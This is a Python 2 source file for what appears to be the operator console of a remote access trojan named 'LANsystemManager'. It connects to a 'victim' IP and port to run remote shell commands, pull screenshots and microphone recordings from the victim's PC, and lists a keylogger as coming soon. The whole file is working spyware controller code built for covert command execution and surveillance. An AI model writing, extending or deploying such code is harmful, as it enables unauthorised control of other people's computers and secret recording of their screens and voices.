import socket
from goto import with_goto
from time import sleep
# Options ranked by importance:
# -----------
# Remote Shell
# Take screenshot
# -- How many
# Record voice
# -- for how much time
# Record key logs

# Make multithreading for doing stuff at the same time
# i.e.: Keylog and have a remote shell at the same time


# Opens a reverse shell to a victim with the victims IP and port (Default is 12345)
def userReverseShell(ip, port):
    # Connecting to the victim via sockets
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ip,port))
    print '-------------------------\n'
    print 'Connection established\n'
    print '-------------------------\n'

    # Send data until keyboardInterrupt or any other problem for continuoes flow
    while True:
        # First get the directory we are in now to display a simple shell
        dataOne = client.sendall('cd')
        cdBytes = client.recv(2048)
        cd = cdBytes + '> '
        cd = cd.replace('\n', '')
        data = raw_input(cd)

        # If the data is empty the user entered an empty character (ELF) so we break
        if data == '':
            client.close()
            break
        
        # Sending the victim the command to execute
        client.sendall(data)
        # Revieving the confirmation and data from the victim
        data = client.recv(50000)

        # Checking if there was a problem in the victims part
        if(data == 'exited\n'):
            print '-------------------------\n'
            print 'Connection closed\n'
            print '-------------------------\n'
            client.close()
            break
        else:
            print data
    # At the end close the connection
    client.close()

# Print all the options the LANsystemManager has to offer in this version
def printOptions():
    print "[1] Remote Shell\n[2] Take screenshot\n[3] Record voice\n[4] Keylog\0\n"

# Takes a recording and doesnt stop until it is silent
def takeRecording(ip, port):
    # Connecting to the victim via sockets
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ip,port))

    # Telling the host to capture a recording of the microphone
    data = client.sendall('rs')
    try:
        # A simple protocol, Getting the size of the file
        # and checking if there was no error than sending
        # a SUCCESS message that we got the info and finally
        # recieving the data of the recording in bytes
        sizeOfRec = client.recv(1000000)
        if sizeOfRec != "ERROR":
            client.sendall("SUCCESS")
            recieved = client.recv(int(sizeOfRec)*2)
        else:
            client.sendall("FAIL")
            recieved = client.recv(2048)
    except:
        recieved = null
    # Opening the file of the recording to save the recording of the host
    myfile = open('C:/TestRemoteShell/recordingSent.wav', 'wb')

    # Trying to write to the file and closing connection
    if not recieved or recieved == "FAILED":
        myfile.close()
        raise
    myfile.write(recieved)
    myfile.close()
    recieved = client.recv(1024)
    client.close()

    # Printing the corresponding event, SUCCESS or FAIL
    if recieved == 'rs taken':
        print '-------------------------\n'
        print 'Captures recording succefully!\n'
        print '-------------------------\n'
    else:
        print '-------------------------\n'
        print 'Failed capturing recording!\n'
        print '-------------------------\n'

# Takes a screenshot of the victims PC
def takeAScreenShot(ip, port):
    # Connecting to the victim via sockets
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ip,port))

    # Telling the host to take a screenshot and send it
    data = client.sendall('ss')
    try:
        # A simple protocol, Getting the size of the file
        # and checking if there was no error than sending
        # a SUCCESS message that we got the info and finally
        # recieving the data of the screenshot in bytes
        sizeOfImage = client.recv(1000000)
        if sizeOfImage != "ERROR":
            client.sendall("SUCCESS")
            recieved = client.recv(int(sizeOfImage)*2)
        else:
            client.sendall("FAIL")
            recieved = client.recv(2048)
    except:
        recieved = null
    # Opening the the PNG file to save the screenshot of the host
    myfile = open('C:/TestRemoteShell/victimSS.png', 'wb')

    # Trying to write to the file and closing connection
    if not recieved or recieved == "FAILED":
        myfile.close()
        raise
    myfile.write(recieved)
    myfile.close()
    recieved = client.recv(1024)
    client.close()

    # Printing the corresponding event, SUCCESS or FAIL
    if recieved == 'ss taken':
        print '-------------------------\n'
        print 'Taken screenshot succefully!\n'
        print '-------------------------\n'
    else:
        print '-------------------------\n'
        print 'Failed taking screenshot!\n'
        print '-------------------------\n'

@with_goto
def main():
    label .begin
    try:
        printOptions()
        opt = int(raw_input('- [+] Your choise: '))
        print '\n'

        if opt == 1: # Remote shell [Status: DONE]
            try:
                ipVic = raw_input('-- [*] Enter the IP of the host(VICTIM): ')
                portVic = int(raw_input('-- [*] Enter the port of the open reverse shell: '))
                print '\n'
                userReverseShell(ipVic, portVic)
            except:
                print 'One or more inputs are incorrect\n'
            finally:
                goto .begin
        elif opt == 2: # Take screenshot [Status: DONE]
            try:
                ipVic = raw_input('-- [*] Enter the IP of the host(VICTIM): ')
                portVic = int(raw_input('-- [*] Enter the port of the open reverse shell: '))
                print '\n'

                print 'Trying to take screenshot\n'
                takeAScreenShot(ipVic, portVic)
            except expression as identifier:
                print 'Something went wrong\n'
            finally:
                goto .begin
        elif opt == 3: # Record voice [Status: DONE]
            try:
                ipVic = raw_input('-- [*] Enter the IP of the host(VICTIM): ')
                portVic = int(raw_input('-- [*] Enter the port of the open reverse shell: '))
                print '\n'

                print 'Trying to capture a recording\n'
                takeRecording(ipVic, portVic)
            except expression as identifier:
                print 'Something went wrong\n'
            finally:
                goto .begin
        elif opt == 4: # Keylog [Status: INCOMPLETE]
            print 'Comming soon'

        else:
            print 'Not a valid option\n'

        print 'Exiting\n'
        print '-------------------------\n'
        sleep(1.5)
    except:
        print 'Either session is closed or a wrong option\n'

if __name__ == "__main__":
    main()